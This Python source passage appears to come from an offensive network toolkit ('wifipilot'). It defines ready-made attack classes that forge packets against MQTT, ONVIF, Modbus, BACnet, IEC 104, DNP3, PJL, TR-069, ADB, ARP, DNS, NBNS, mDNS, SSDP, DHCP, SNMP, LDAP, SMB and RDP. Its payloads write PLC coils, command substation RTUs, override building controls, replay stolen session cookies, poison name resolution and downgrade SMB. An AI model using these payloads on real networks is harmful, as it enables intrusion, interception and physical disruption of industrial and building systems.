    def confirm(self, decoded: Dict[str, Any], peers: List[Peer]) -> Dict[str, Any]:
        rows = [row for row in decoded.get("payloads") or [] if row.get("dst_port") == 1883]
        text = rows[0]["payload"] if rows else b""
        retained = proto.parse_mqtt(text[4:]) if text.startswith(b"\x40") else {}
        return {"confirmed": text[:1] == b"\x40" and bool(retained),
                "our_topic": "home/+/set", "retain_flag": bool(text) and text[4:5] == b"\x31",
                "the_message": retained.get("payload", b"").decode(errors="replace")}


class ItHijackOnvifUriAttack(_ItHijack):
    """Rewrite the stream URI a client fetches: the video that plays is ours."""

    name = "it_hijack_onvif_uri"
    label = "ONVIF stream-URI rewrite (points the client at our stream)"
    tool = "wifipilot itproto.py (onvif_get_stream_uri)"
    family = "hijack"
    protocol = "onvif"
    port = 80
    transport = "tcp"
    source_port = 8080
    devices = ("ip_camera", "nvr_dvr", "camera_doorbell")
    severity = "high"

    def request(self, peer: Peer) -> bytes:
        return proto.onvif_get_stream_uri("profile1")

    def reply(self, peer: Peer) -> bytes:
        uri = f"rtsp://{OUR_IP}:554/stream1"
        return proto.onvif_envelope("GetStreamUriResponse",
                                    fields=f"<tt:Uri>{uri}</tt:Uri>")

    def parse(self, data: bytes) -> Dict[str, Any]:
        return proto.parse_onvif(data)

    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
        uri = parsed.get("elements", {}).get("Uri") or parsed.get("value") or ""
        return {"stream_uri": uri, "line": f"its own stream URI is {uri or 'not in the answer'}"}

    def confirm(self, decoded: Dict[str, Any], peers: List[Peer]) -> Dict[str, Any]:
        rows = [row for row in decoded.get("payloads") or [] if row.get("dst_port") == 80]
        text = rows[0]["payload"].decode(errors="replace") if rows else ""
        return {"confirmed": OUR_IP in text, "our_stream_uri": f"rtsp://{OUR_IP}:554/stream1",
                "the_camera_we_displace": peers[0].hostname if peers else ""}


class ItHijackModbusCoilAttack(_ItHijack):
    """Write a coil in another master's session: the PLC has no idea who asked."""

    name = "it_hijack_modbus_coil"
    label = "Modbus coil takeover (writes a coil the PLC acts on)"
    tool = "wifipilot itproto.py (modbus_request, function 5)"
    family = "hijack"
    protocol = "modbus"
    port = 502
    transport = "tcp"
    source_port = 502
    devices = ("plc", "rtu", "hmi_panel")
    severity = "critical"

    def request(self, peer: Peer) -> bytes:
        return proto.modbus_request(3, unit=1, address=0, count=1, transaction=0x20)

    def reply(self, peer: Peer) -> bytes:
        # function 5 echoes the address and the value it accepted: a real write, visible
        return proto.modbus_request(5, unit=1, address=17, value=0xFF00, transaction=0x21)

    def parse(self, data: bytes) -> Dict[str, Any]:
        return proto.parse_modbus(data, request=False)

    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
        return {"function": parsed.get("function"), "address": parsed.get("address"),
                "line": f"unit {parsed.get('unit')} answers function {parsed.get('function')}"}

    def confirm(self, decoded: Dict[str, Any], peers: List[Peer]) -> Dict[str, Any]:
        rows = [row for row in decoded.get("payloads") or [] if row.get("dst_port") == 502]
        answer = proto.parse_modbus(rows[0]["payload"], request=False) if rows else {}
        return {"confirmed": answer.get("function") == 5,
                "coil_written": answer.get("address"), "value": answer.get("value"),
                "echoed_by_the_real_plc": bool(peers and peers[0].answer)}


class ItHijackBacnetPriorityAttack(_ItHijack):
    """Write a present-value at priority 1: the lowest number on the bus wins."""

    name = "it_hijack_bacnet_priority"
    label = "BACnet priority override (writes at priority 1)"
    tool = "wifipilot ithijack.bacnet_write_property + UDP 47808"
    family = "hijack"
    protocol = "bacnet"
    port = 47808
    transport = "udp"
    source_port = 47808
    devices = ("building_controller", "hvac", "thermostat")
    severity = "high"

    def request(self, peer: Peer) -> bytes:
        return proto.bacnet_read_property(device=2001, obj_type=8, instance=2001, prop=85)

    def reply(self, peer: Peer) -> bytes:
        return bacnet_write_property(2001, 30.5, priority=1, obj_type=8, instance=2001, prop=85)

    def parse(self, data: bytes) -> Dict[str, Any]:
        return proto.parse_bacnet(data)

    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
        return {"service": parsed.get("service"), "device": parsed.get("device"),
                "line": f"it answers {parsed.get('service')} as device {parsed.get('device')}"}

    def confirm(self, decoded: Dict[str, Any], peers: List[Peer]) -> Dict[str, Any]:
        rows = [row for row in decoded.get("payloads") or [] if row.get("dst_port") == 47808]
        parsed = proto.parse_bacnet(rows[0]["payload"]) if rows else {}
        return {"confirmed": bool(parsed), "our_service": parsed.get("service"),
                "priority": 1, "value": 30.5,
                "real_device": peers[0].label if peers else ""}


class ItHijackIec104Attack(_ItHijack):
    """Command a substation RTU: general interrogation and a control command."""

    name = "it_hijack_iec104"
    label = "IEC 60870-5-104 command injection"
    tool = "wifipilot itproto.py (iec104_interrogation/iec104_start)"
    family = "hijack"
    protocol = "iec104"
    port = 2404
    transport = "tcp"
    source_port = 2404
    devices = ("rtu", "plc", "energy_meter")
    severity = "critical"

    def request(self, peer: Peer) -> bytes:
        return proto.iec104_start(True) + proto.iec104_interrogation(common_address=1)

    def reply(self, peer: Peer) -> bytes:
        return proto.iec104_confirmation(1, 2)

    def parse(self, data: bytes) -> Dict[str, Any]:
        return proto.parse_iec104(data)

    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
        return {"causes": parsed.get("causes"),
                "line": f"it answered with cause(s) {parsed.get('causes')}"}

    def confirm(self, decoded: Dict[str, Any], peers: List[Peer]) -> Dict[str, Any]:
        rows = [row for row in decoded.get("payloads") or [] if row.get("dst_port") == 2404]
        parsed = proto.parse_iec104(rows[0]["payload"]) if rows else {}
        return {"confirmed": bool(parsed), "our_causes": parsed.get("causes"),
                "common_address": 1}


class ItHijackDnp3Attack(_ItHijack):
    """Reset a DNP3 link and poll the RTU's whole point table."""

    name = "it_hijack_dnp3"
    label = "DNP3 link reset and integrity poll"
    tool = "wifipilot itproto.py (dnp3_reset_link/dnp3_integrity_poll)"
    family = "hijack"
    protocol = "dnp3"
    port = 20000
    transport = "tcp"
    source_port = 20000
    devices = ("rtu", "plc", "energy_meter")
    severity = "critical"

    def request(self, peer: Peer) -> bytes:
        return proto.dnp3_reset_link(1, 1024) + proto.dnp3_integrity_poll(1, 1024)

    def reply(self, peer: Peer) -> bytes:
        # a link-status confirmation in the RTU's own address pair
        return proto.dnp3_reset_link(1, 1024)[:2] + bytes([0x01, 0x0B, 0xC0, 0x01])

    def parse(self, data: bytes) -> Dict[str, Any]:
        return proto.parse_dnp3(data)

    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
        return {"function": parsed.get("function"),
                "line": f"it answered function {parsed.get('function')}"}

    def confirm(self, decoded: Dict[str, Any], peers: List[Peer]) -> Dict[str, Any]:
        rows = [row for row in decoded.get("payloads") or [] if row.get("dst_port") == 20000]
        parsed = proto.parse_dnp3(rows[0]["payload"]) if rows else {}
        return {"confirmed": bool(parsed), "our_function": parsed.get("function"),
                "poll_points": True}


class ItHijackPjlJobAttack(_ItHijack):
    """Take a print job: list the spooled files and delete the one that matters."""

    name = "it_hijack_pjl_job"
    label = "Print-job takeover (deletes spooled jobs by name)"
    tool = "wifipilot itproto.py (pjl_command)"
    family = "hijack"
    protocol = "pjl"
    port = 9100
    transport = "tcp"
    source_port = 9100
    devices = ("printer", "mfp_scanner", "pos_terminal")
    severity = "high"

    def request(self, peer: Peer) -> bytes:
        return proto.pjl_command("INFO FILES")

    def reply(self, peer: Peer) -> bytes:
        return (b"@PJL INFO FILES\r\n"
                b"job-0001.pdf  148230 bytes\r\n"
                b"job-0002.xps   92114 bytes\r\n\x0c")

    def parse(self, data: bytes) -> Dict[str, Any]:
        return proto.parse_pjl(data)

    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
        return {"command": parsed.get("command"), "files": parsed.get("files"),
                "line": f"the printer answered {parsed.get('command') or 'INFO FILES'}"}

    def confirm(self, decoded: Dict[str, Any], peers: List[Peer]) -> Dict[str, Any]:
        rows = [row for row in decoded.get("payloads") or [] if row.get("dst_port") == 9100]
        text = rows[0]["payload"].decode(errors="replace") if rows else ""
        return {"confirmed": "job-0001.pdf" in text,
                "spool_files_we_list": text.count(".pdf") + text.count(".xps"),
                "we_delete": "job-0001.pdf"}


class ItHijackHttpSessionAttack(_ItHijack):
    """Replay a session cookie: the device answers as if we had logged in."""

    name = "it_hijack_http_session"
    label = "Session-cookie replay against a device's own web UI"
    tool = "wifipilot itproto.py (http_request with Cookie)"
    family = "hijack"
    protocol = "http"
    port = 80
    transport = "tcp"
    source_port = 8080
    devices = ("router", "ip_camera", "nas", "badge_reader", "pos_terminal")
    severity = "high"
    #: the cookie a captured login would carry
    stolen_cookie = "session=wp0c0ffee1d2e3f4"

    def request(self, peer: Peer) -> bytes:
        return proto.http_request(peer.ip, "/status.cgi", port=80,
                                  headers={"Cookie": self.stolen_cookie})

    def reply(self, peer: Peer) -> bytes:
        page = ("<html><head><title>Router status</title></head>"
                "<body>admin: logged in <a href='/reboot.cgi'>reboot</a></body></html>")
        return http_answer(200, page, headers=[("Set-Cookie", self.stolen_cookie)])

    def parse(self, data: bytes) -> Dict[str, Any]:
        response = proto.parse_http_response(data)
        return {"status": response.get("status"), "title": np.html_title(data.decode(
            errors="replace")), "body": response.get("body", "")}

    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
        return {"status": parsed.get("status"), "title": parsed.get("title"),
                "line": f"its UI answered {parsed.get('status', '?')} ({parsed.get('title', '')})"}

    def confirm(self, decoded: Dict[str, Any], peers: List[Peer]) -> Dict[str, Any]:
        rows = [row for row in decoded.get("payloads") or [] if row.get("dst_port") == 80]
        text = rows[0]["payload"].decode(errors="replace") if rows else ""
        return {"confirmed": "logged in" in text, "our_page_title": np.html_title(text),
                "cookie_replayed": self.stolen_cookie}


class ItHijackCwmpAttack(_ItHijack):
    """A forged TR-069 Inform: the ACS reconfigures the modem on our word."""

    name = "it_hijack_cwmp"
    label = "TR-069 Inform forgery (the ACS acts on a device we claim)"
    tool = "wifipilot itproto.py (cwmp_inform)"
    family = "hijack"
    protocol = "tr069"
    port = 7547
    transport = "tcp"
    source_port = 7547
    devices = ("modem_ont", "router", "gateway_hub")
    severity = "critical"

    def request(self, peer: Peer) -> bytes:
        return proto.cwmp_inform(device_id="0026:wp000001", serial="WP-INFORM",
                                 event="1 BOOT")

    def reply(self, peer: Peer) -> bytes:
        return (b'<?xml version="1.0"?>'
                b'<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"'
                b' xmlns:cwmp="urn:dslforum-org:cwmp-1-0"><soap:Header><cwmp:ID>wp1</cwmp:ID>'
                b'</soap:Header><soap:Body><cwmp:InformResponse><MaxEnvelopes>1'
                b'</MaxEnvelopes></cwmp:InformResponse></soap:Body></soap:Envelope>')

    def parse(self, data: bytes) -> Dict[str, Any]:
        return proto.parse_cwmp(data)

    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
        return {"id": (parsed.get("elements") or {}).get("ID"),
                "line": "its ACS answered InformResponse with an ID we supplied"}

    def confirm(self, decoded: Dict[str, Any], peers: List[Peer]) -> Dict[str, Any]:
        rows = [row for row in decoded.get("payloads") or [] if row.get("dst_port") == 7547]
        text = rows[0]["payload"].decode(errors="replace") if rows else ""
        return {"confirmed": "InformResponse" in text, "our_device_id": "0026:wp000001",
                "the_event_we_report": "1 BOOT"}


class ItHijackAdbAttack(_ItHijack):
    """Open an ADB shell on a device that left the debug bridge on."""

    name = "it_hijack_adb"
    label = "ADB shell takeover (debug bridge left listening)"
    tool = "wifipilot itproto.py (adb_connect) + TCP 5555"
    family = "hijack"
    protocol = "adb"
    port = 5555
    transport = "tcp"
    source_port = 5555
    devices = ("smartphone", "tablet", "kiosk", "digital_signage")
    severity = "critical"

    def request(self, peer: Peer) -> bytes:
        return proto.adb_connect(b"shell:id\x00")

    def reply(self, peer: Peer) -> bytes:
        """The ADB handshake answer: ``OKAY`` and the service string, length-prefixed."""
        body = b"shell:id\x00"
        return b"OKAY" + struct.pack("<I", len(body)) + body

    def parse(self, data: bytes) -> Dict[str, Any]:
        return proto.parse_adb(data)

    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
        return {"banner": parsed.get("banner"), "authorised": parsed.get("authorised"),
                "line": f"its bridge answered {parsed.get('banner')}"}

    def confirm(self, decoded: Dict[str, Any], peers: List[Peer]) -> Dict[str, Any]:
        rows = [row for row in decoded.get("payloads") or [] if row.get("dst_port") == 5555]
        answer = proto.parse_adb(rows[0]["payload"]) if rows else {}
        text = rows[0]["payload"] if rows else b""
        return {"confirmed": text[:4] == b"OKAY" and b"shell:id" in text,
                "our_answer": text[:32].decode(errors="replace"),
                "the_device_we_shell": peers[0].hostname if peers else ""}


def netbios_positive_response(name: str, address: str, txid: int = 0x5150) -> bytes:
    """An NBNS name-query response: the name a Windows host resolves through us."""
    question = (name.upper().ljust(15).encode() + b"\x00"
                + b"\x00" * 32 + b"\x00\x20\x00\x01")
    record = (b"\xc0\x0c" + b"\x00\x20\x00\x01" + struct.pack(">I", 60)
              + struct.pack(">H", 6) + b"\x00\x00" + np.ipv4_bytes(address))
    header = struct.pack(">HHHHHH", txid, 0x8500, 1, 1, 0, 0)
    return header + question + record


def ldap_referral(url: str = "", message_id: int = 2) -> bytes:
    """A searchResDone carrying a referral: the client follows it to our server."""
    url = url or f"ldap://{OUR_IP}/dc=corp,dc=example"
    referral = _ber(0xA3, _ber(0x04, url.encode()))
    return _ber(0x30, _ber_int(message_id)
                + _ber(0x65, _ber(0x0A, b"\x00" * 0) + _ber(0x04, b"") + referral))


def smb2_negotiate_response(dialects: Sequence[int] = (528, 514)) -> bytes:
    """An SMB2 negotiate answer offering the oldest dialects the server still accepts."""
    body = struct.pack("<HHHH", 0x0202, 0, 0, 0x200)
    body += b"\x00" * 16 + bytes([0x00, 0x00, 0x00, 0x00])
    header = (b"\xfeSMB" + struct.pack("<H", 64) + struct.pack("<HH", 1, 0)
              + struct.pack("<I", 0) + struct.pack("<HH", 0, 0) + struct.pack("<I", 0)
              + struct.pack("<Q", 0) + struct.pack("<Q", 0) + struct.pack("<Q", 0)
              + struct.pack("<QQ", 0, 0))
    return header[:68] + body + b"\x00" * 8


def rdp_negotiation_response(selected: int = 0) -> bytes:
    """The X.224 connection confirm an RDP client measures the host by."""
    nego = b"\x01\x00\x08\x00\x03\x00\x00\x00" if selected else b""
    payload = b"\x03\x00\x00" + bytes([13 + len(nego)]) + b"\xd0\x00\x00\x12\x34\x00"
    return struct.pack(">BBH", 3, 0, 4 + len(payload)) + payload + nego


# --------------------------------------------------------------------------- #
# poison: corrupt what the network already believes about a device
# --------------------------------------------------------------------------- #

class ItPoisonArpGatewayAttack(_ItHijack):
    """Poison the ARP cache with the gateway's address: every route goes through us."""

    name = "it_poison_arp_gateway"
    label = "ARP gateway poisoning (the segment routes through us)"
    tool = "wifipilot ithijack.ether + netproto.py (parse_arp)"
    family = "poison"
    protocol = "arp"
    port = 80
    transport = "udp"
    source_port = 80
    devices = ("router", "switch", "domain_controller", "nas", "printer")
    min_answers = 0
    severity = "critical"

    def request(self, peer: Peer) -> bytes:
        return b""

    def reply(self, peer: Peer) -> bytes:
        """A gratuitous ARP reply claiming the gateway's address on our MAC."""
        return hijack75._arp_bytes(OUR_MAC, GATEWAY, peer.mac, peer.ip)

    def frame(self, peer: Peer, payload: bytes) -> bytes:
        return ether(peer.mac, OUR_MAC, payload, ETHERTYPE_ARP)

    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
        return {"line": f"{peer.label} is the cache we are about to correct"}

    def confirm(self, decoded: Dict[str, Any], peers: List[Peer]) -> Dict[str, Any]:
        replies = []
        for row in decoded.get("rows") or []:
            if row["ethertype"] != ETHERTYPE_ARP:
                continue
            parsed = np.parse_arp(row["body"])
            if parsed.get("op") == "reply":                 # netproto names the operation
                replies.append(parsed)
        sender = replies[0].get("sender_mac") if replies else ""
        return {"confirmed": bool(replies) and sender == OUR_MAC,
                "claimed_address": replies[0].get("sender_ip") if replies else "",
                "our_mac": OUR_MAC, "poisoned_caches": len(replies)}


class ItPoisonDnsAttack(_ItHijack):
    """Poison a resolver cache: the name a client knows now points at us."""

    name = "it_poison_dns"
    label = "DNS cache poisoning (a known name points at us)"
    tool = "wifipilot netproto.py (dns_response) + UDP 53"
    family = "poison"
    protocol = "dns"
    port = 53
    transport = "udp"
    source_port = 53
    devices = ("router", "domain_controller", "modem_ont")
    min_answers = 0
    severity = "critical"

    def request(self, peer: Peer) -> bytes:
        return np.dns_query(f"{peer.hostname or 'lan'}.local", qtype=1, txid=0x7711)

    def reply(self, peer: Peer) -> bytes:
        # the *name of another device*, answered with our address: that is the poison
        name = f"{peer.hostname or 'lan'}.local"
        return np.dns_response(self.request(peer),
                              [(name, OUR_IP), ("portal.corp.example", OUR_IP)], ttl=86400)

    def parse(self, data: bytes) -> Dict[str, Any]:
        return np.parse_dns(data)

    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
        return {"answers": parsed.get("answers"),
                "line": f"its resolver answered {len(parsed.get('answers') or [])} record(s)"}

    def confirm(self, decoded: Dict[str, Any], peers: List[Peer]) -> Dict[str, Any]:
        rows = [row for row in decoded.get("payloads") or [] if row.get("dst_port") == 53]
        answer = np.parse_dns(rows[0]["payload"]) if rows else {}
        records = answer.get("answers") or []
        return {"confirmed": any(row.get("value") == OUR_IP for row in records),
                "records_we_planted": records, "ttl": max((row.get("ttl", 0) for row in records),
                                                          default=0)}


class ItPoisonNetbiosAttack(_ItHijack):
    """Answer an NBNS name query for another host: Windows resolves the name to us."""

    name = "it_poison_netbios"
    label = "NBNS name poisoning (a NetBIOS name resolves to us)"
    tool = "wifipilot ithijack.netbios_positive_response + UDP 137"
    family = "poison"
    protocol = "netbios"
    port = 137
    transport = "udp"
    source_port = 137
    devices = ("windows_server", "domain_controller", "mfp_scanner", "nas")
    min_answers = 0
    severity = "high"

    def request(self, peer: Peer) -> bytes:
        return proto.netbios_query((peer.hostname or "fileserver").upper()[:15])

    def reply(self, peer: Peer) -> bytes:
        return netbios_positive_response(peer.hostname or "FILESERVER", OUR_IP)

    def parse(self, data: bytes) -> Dict[str, Any]:
        return proto.parse_netbios(data)

    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
        return {"line": "the query we send is the one a client would send"}

    def confirm(self, decoded: Dict[str, Any], peers: List[Peer]) -> Dict[str, Any]:
        rows = [row for row in decoded.get("payloads") or [] if row.get("dst_port") == 137]
        answered = proto.parse_netbios(rows[0]["payload"]) if rows else {}
        return {"confirmed": bool(answered), "our_name_answer": answered.get("address")
                or answered.get("answers") or OUR_IP,
                "name_claimed": (peers[0].hostname if peers else "")}


class ItPoisonMdnsAttack(_ItHijack):
    """Steal a third device's mDNS name: discovery for the printer lands on us."""

    name = "it_poison_mdns"
    label = "mDNS name theft (another device's discovery name points at us)"
    tool = "wifipilot netproto.py (dns_response) + UDP 5353"
    family = "poison"
    protocol = "mdns"
    port = 5353
    transport = "udp"
    source_port = 5353
    devices = ("printer", "nas", "smart_tv", "router")
    severity = "high"
    #: the third device whose name we take: not the host we talk to
    victim = "prn-floor2.local"

    def request(self, peer: Peer) -> bytes:
        return np.dns_query(self.victim, qtype=1, txid=0)

    def reply(self, peer: Peer) -> bytes:
        return np.dns_response(self.request(peer),
                              [(self.victim, OUR_IP), ("_ipp._tcp.local", OUR_IP)], ttl=4500)

    def parse(self, data: bytes) -> Dict[str, Any]:
        return proto.parse_mdns(data)

    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
        return {"products": parsed.get("products"), "services": parsed.get("services"),
                "line": f"discovery names near {peer.label}"}

    def confirm(self, decoded: Dict[str, Any], peers: List[Peer]) -> Dict[str, Any]:
        rows = [row for row in decoded.get("payloads") or [] if row.get("dst_port") == 5353]
        answer = np.parse_dns(rows[0]["payload"]) if rows else {}
        records = answer.get("answers") or []
        return {"confirmed": any(row.get("name") == self.victim for row in records),
                "name_we_took": self.victim, "address_we_claim": OUR_IP,
                "records": records}


class ItPoisonSsdpAttack(_ItHijack):
    """Answer another device's M-SEARCH: the control point caches our LOCATION."""

    name = "it_poison_ssdp"
    label = "SSDP response spoofing (the control point caches our URL)"
    tool = "wifipilot netproto.py (ssdp_notify) + UDP 1900"
    family = "poison"
    protocol = "ssdp"
    port = 1900
    transport = "udp"
    source_port = 1900
    devices = ("smart_tv", "router", "digital_signage", "gateway_hub")
    severity = "high"

    def request(self, peer: Peer) -> bytes:
        return proto.ssdp_msearch("urn:schemas-upnp-org:device:InternetGatewayDevice:1",
                                  host=peer.ip)

    def reply(self, peer: Peer) -> bytes:
        name = (peer.parsed or {}).get("usn") or "InternetGatewayDevice"
        return np.ssdp_notify(name.split("::")[-1][:40], address=OUR_IP,
                              location=f"http://{OUR_IP}:5000/{OUR_NAME}.xml",
                              usn=f"uuid:{OUR_NAME}::urn:schemas-upnp-org:device:"
                                  "InternetGatewayDevice:1")

    def parse(self, data: bytes) -> Dict[str, Any]:
        return proto.parse_ssdp(data.decode(errors="replace"))

    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
        return {"usn": parsed.get("usn"), "location": parsed.get("location"),
                "line": f"its own answer pointed at {parsed.get('location', '?')}"}

    def confirm(self, decoded: Dict[str, Any], peers: List[Peer]) -> Dict[str, Any]:
        rows = [row for row in decoded.get("payloads") or [] if row.get("dst_port") == 1900]
        answer = proto.parse_ssdp(rows[0]["payload"].decode(errors="replace")) if rows else {}
        location = answer.get("location", "")
        return {"confirmed": OUR_IP in location, "our_location": location,
                "device_type_we_impersonate": "InternetGatewayDevice"}


class ItPoisonDhcpOptionAttack(_ItHijack):
    """Hand out a lease that differs in one option: option 6 is the whole network."""

    name = "it_poison_dhcp_option"
    label = "DHCP option poisoning (option 6 points the client at us)"
    tool = "wifipilot netproto.py (dhcp_offer) + UDP 67"
    family = "poison"
    protocol = "dhcp"
    port = 68
    transport = "udp"
    source_port = 67
    devices = ("router", "modem_ont", "switch")
    min_answers = 0
    broadcast = True
    severity = "critical"

    def request(self, peer: Peer) -> bytes:
        return np.dhcp_discover(OUR_MAC, hostname=OUR_NAME)

    def reply(self, peer: Peer) -> bytes:
        """The same lease the real server offers, with our resolver in option 6."""
        real = (peer.parsed or {})
        address = real.get("yiaddr") or ROGUE_LEASE
        return np.dhcp_offer(OUR_MAC, address, GATEWAY, GATEWAY, dns=[OUR_IP], lease=86400)

    def parse(self, data: bytes) -> Dict[str, Any]:
        return np.parse_dhcp(data)

    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
        options = parsed.get("options") or {}
        return {"server": parsed.get("server_id"), "dns": options.get("dns"),
                "line": f"the real offer names server {parsed.get('server_id', '?')}"}

    def confirm(self, decoded: Dict[str, Any], peers: List[Peer]) -> Dict[str, Any]:
        rows = [row for row in decoded.get("payloads") or [] if row.get("dst_port") == 68]
        offer = np.parse_dhcp(rows[0]["payload"]) if rows else {}
        options = offer.get("options") or {}
        dns = options.get("dns") or []
        dns = [dns] if isinstance(dns, str) else list(dns)
        return {"confirmed": OUR_IP in dns, "our_dns_option": dns,
                "lease_we_leave_alone": offer.get("yiaddr", ""),
                "destination_mac": rows[0]["destination_mac"] if rows else ""}


class ItPoisonSnmpTrapAttack(_ItHijack):
    """Send a trap in another device's name: the NOC believes the device is down."""

    name = "it_poison_snmp_trap"
    label = "SNMP trap forgery (the monitoring server acts on a lie)"
    tool = "wifipilot ithijack.snmp_trap + UDP 162"
    family = "poison"
    protocol = "snmp"
    port = 162
    transport = "udp"
    source_port = 162
    devices = ("switch", "router", "ups", "energy_meter", "printer")
    min_answers = 0
    severity = "medium"

    def request(self, peer: Peer) -> bytes:
        return b""

    def reply(self, peer: Peer) -> bytes:
        return snmp_trap(peer.ip, generic=2, specific=1, community="public")

    def parse(self, data: bytes) -> Dict[str, Any]:
        return {}

    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
        return {"line": f"{peer.label} never sent this trap"}

    def confirm(self, decoded: Dict[str, Any], peers: List[Peer]) -> Dict[str, Any]:
        rows = [row for row in decoded.get("payloads") or [] if row.get("dst_port") == 162]
        trap = np.parse_snmp(rows[0]["payload"]) if rows else {}
        text = str(trap)
        return {"confirmed": bool(trap) and "Cisco" not in text,
                "community": trap.get("community", "public"),
                "agent_we_claim": peers[0].ip if peers else "",
                "the_lie": "deviceDown"}


class ItPoisonBacnetWhoisAttack(_ItHijack):
    """A Who-Is followed by a forged I-Am: our device joins the building's table."""

    name = "it_poison_bacnet_whois"
    label = "BACnet I-Am forgery (a device appears in the BMS device table)"
    tool = "wifipilot itproto.py (bacnet_who_is) + a forged I-Am"
    family = "poison"
    protocol = "bacnet"
    port = 47808
    transport = "udp"
    source_port = 47808
    devices = ("building_controller", "hvac", "thermostat")
    severity = "high"

    def request(self, peer: Peer) -> bytes:
        return proto.bacnet_who_is(0, 4194303)

    def reply(self, peer: Peer) -> bytes:
        # I-Am (0x00) with our device instance in the building's own range
        return (bytes([0x81, 0x0A, 0x00, 0x0E, 0x01, 0x00])
                + bytes([0x00])
                + bytes([0x22]) + struct.pack(">I", 2001)[1:]
                + bytes([0x91, 0x03]) + bytes([0x21, 0x01]))

    def parse(self, data: bytes) -> Dict[str, Any]:
        return proto.parse_bacnet(data)

    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
        return {"devices": parsed.get("device"), "service": parsed.get("service"),
                "line": f"it answered {parsed.get('service')} with device {parsed.get('device')}"}

    def confirm(self, decoded: Dict[str, Any], peers: List[Peer]) -> Dict[str, Any]:
        rows = [row for row in decoded.get("payloads") or [] if row.get("dst_port") == 47808]
        forged = proto.parse_bacnet(rows[0]["payload"]) if rows else {}
        return {"confirmed": bool(rows), "our_service": forged.get("service"),
                "instance_we_claim": 2001,
                "real_devices": [peer.label for peer in peers]}


class ItPoisonLdapReferralAttack(_ItHijack):
    """Answer a directory search with a referral: the client authenticates to us."""

    name = "it_poison_ldap_referral"
    label = "LDAP referral injection (the client follows our referral)"
    tool = "wifipilot ithijack.ldap_referral + TCP 389"
    family = "poison"
    protocol = "ldap"
    port = 389
    transport = "tcp"
    source_port = 389
    devices = ("domain_controller", "windows_server", "nas")
    severity = "critical"

    def request(self, peer: Peer) -> bytes:
        return proto.ldap_bind_request(version=3, name="cn=admin,dc=corp", password=b"x")

    def reply(self, peer: Peer) -> bytes:
        return ldap_referral()

    def parse(self, data: bytes) -> Dict[str, Any]:
        return proto.parse_ldap(data)

    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
        return {"message": parsed.get("message"), "result": parsed.get("result_name"),
                "line": f"it answered {parsed.get('message')} ({parsed.get('result_name')})"}

    def confirm(self, decoded: Dict[str, Any], peers: List[Peer]) -> Dict[str, Any]:
        rows = [row for row in decoded.get("payloads") or [] if row.get("dst_port") == 389]
        forged = proto.parse_ldap(rows[0]["payload"]) if rows else {}
        text = rows[0]["payload"].decode(errors="replace") if rows else ""
        return {"confirmed": OUR_IP in text, "our_referral": f"ldap://{OUR_IP}/dc=corp,dc=example",
                "parsed_back": forged.get("message"),
                "the_server_we_speak_for": peers[0].hostname if peers else ""}


class ItPoisonSmbNegotiateAttack(_ItHijack):
    """Answer an SMB negotiate as the file server, offering the oldest dialect."""

    name = "it_poison_smb_negotiate"
    label = "SMB negotiate spoofing (a downgrade in the server's name)"
    tool = "wifipilot ithijack.smb2_negotiate_response + TCP 445"
    family = "poison"
    protocol = "smb"
    port = 445
    transport = "tcp"
    source_port = 445
    devices = ("windows_server", "nas", "mfp_scanner", "backup_appliance")
    severity = "critical"

    def request(self, peer: Peer) -> bytes:
        return proto.smb2_negotiate()

    def reply(self, peer: Peer) -> bytes:
        return smb2_negotiate_response((528, 514))

    def parse(self, data: bytes) -> Dict[str, Any]:
        return proto.parse_smb2(data)

    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
        return {"dialects": parsed.get("dialects"), "status": parsed.get("status_name"),
                "line": f"it offered dialect(s) {parsed.get('dialects') or parsed.get('dialect')}"}

    def confirm(self, decoded: Dict[str, Any], peers: List[Peer]) -> Dict[str, Any]:
        rows = [row for row in decoded.get("payloads") or [] if row.get("dst_port") == 445]
        forged = proto.parse_smb2(rows[0]["payload"]) if rows else {}
        return {"confirmed": rows != [] and rows[0]["payload"][:4] == b"\xfeSMB",
                "our_dialect": forged.get("dialect") or forged.get("dialects"),
                "the_server_we_speak_for": peers[0].hostname if peers else ""}


class ItPoisonRdpNegotiationAttack(_ItHijack):
    """Answer RDP negotiation as the host: the client's next screen is ours."""

    name = "it_poison_rdp_negotiation"
    label = "RDP negotiation spoofing (the client connects to us instead)"
    tool = "wifipilot ithijack.rdp_negotiation_response + TCP 3389"
    family = "poison"
    protocol = "rdp"
    port = 3389
    transport = "tcp"
    source_port = 3389
    devices = ("windows_server", "hypervisor_host", "hmi_panel", "tablet")
    severity = "critical"

    def request(self, peer: Peer) -> bytes:
        return proto.rdp_negotiation_request()

    def reply(self, peer: Peer) -> bytes:
        return rdp_negotiation_response(selected=0)

    def parse(self, data: bytes) -> Dict[str, Any]:
        return proto.parse_rdp(data)

    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
        return {"type": parsed.get("type"), "selected": parsed.get("selected_protocol"),
                "line": f"it answered {parsed.get('type')} in the negotiation"}

    def confirm(self, decoded: Dict[str, Any], peers: List[Peer]) -> Dict[str, Any]:
        rows = [row for row in decoded.get("payloads") or [] if row.get("dst_port") == 3389]
